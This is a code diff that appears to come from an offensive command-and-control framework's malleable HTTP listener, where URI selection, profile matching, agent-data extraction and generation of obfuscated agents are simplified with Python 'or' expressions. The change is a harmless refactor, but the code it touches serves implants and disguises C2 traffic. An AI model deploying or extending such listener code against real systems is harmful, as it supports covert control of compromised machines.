@@ -884,16 +884,7 @@ try {{
             # ==== CHOOSE URI ====
             getTask += (
                 "$taskURI = "
-                + ",".join(
-                    [
-                        f"'{u}'"
-                        for u in (
-                            profile.get.client.uris
-                            if profile.get.client.uris
-                            else ["/"]
-                        )
-                    ]
-                )
+                + ",".join([f"'{u}'" for u in (profile.get.client.uris or ["/"])])
                 + " | Get-Random;"
             )
 
@@ -1005,16 +996,7 @@ $vWc.Proxy = $Script:Proxy;
             # ==== CHOOSE URI ====
             sendMessage += (
                 "$taskURI = "
-                + ",".join(
-                    [
-                        f"'{u}'"
-                        for u in (
-                            profile.post.client.uris
-                            if profile.post.client.uris
-                            else ["/"]
-                        )
-                    ]
-                )
+                + ",".join([f"'{u}'" for u in (profile.post.client.uris or ["/"])])
                 + " | Get-Random;"
             )
 
@@ -1395,20 +1377,16 @@ class ExtendedPacketHandler(PacketHandler):
                 # identify the implementation by uri
                 implementation = None
                 for uri in sorted(
-                    (
-                        profile.stager.client.uris
-                        if profile.stager.client.uris
-                        else ["/"]
-                    )
-                    + (profile.get.client.uris if profile.get.client.uris else ["/"])
-                    + (profile.post.client.uris if profile.post.client.uris else ["/"]),
+                    (profile.stager.client.uris or ["/"])
+                    + (profile.get.client.uris or ["/"])
+                    + (profile.post.client.uris or ["/"]),
                     key=len,
                     reverse=True,
                 ):
                     if request_uri.startswith(uri.lstrip("/")):
                         # match!
                         for imp in [profile.stager, profile.get, profile.post]:
-                            if uri in (imp.client.uris if imp.client.uris else ["/"]):
+                            if uri in (imp.client.uris or ["/"]):
                                 implementation = imp
                                 break
                         if implementation:
@@ -1429,9 +1407,7 @@ class ExtendedPacketHandler(PacketHandler):
                 elif implementation is profile.post:
                     # the post implementation has two spots for data, requires two-part extraction
                     agentInfo, output = implementation.extract_client(malleableRequest)
-                    agentInfo = (agentInfo if agentInfo else b"") + (
-                        output if output else b""
-                    )
+                    agentInfo = (agentInfo or b"") + (output or b"")
                     self.instance_log.debug(
                         f"{listenerName}: extracted agentInfo from post (two-part), len={len(agentInfo)}"
                     )
@@ -1594,9 +1570,7 @@ class ExtendedPacketHandler(PacketHandler):
                                     agentCode = self.generate_agent(
                                         language=language,
                                         listenerOptions=(
-                                            tempListenerOptions
-                                            if tempListenerOptions
-                                            else listenerOptions
+                                            tempListenerOptions or listenerOptions
                                         ),
                                         obfuscate=(
                                             False
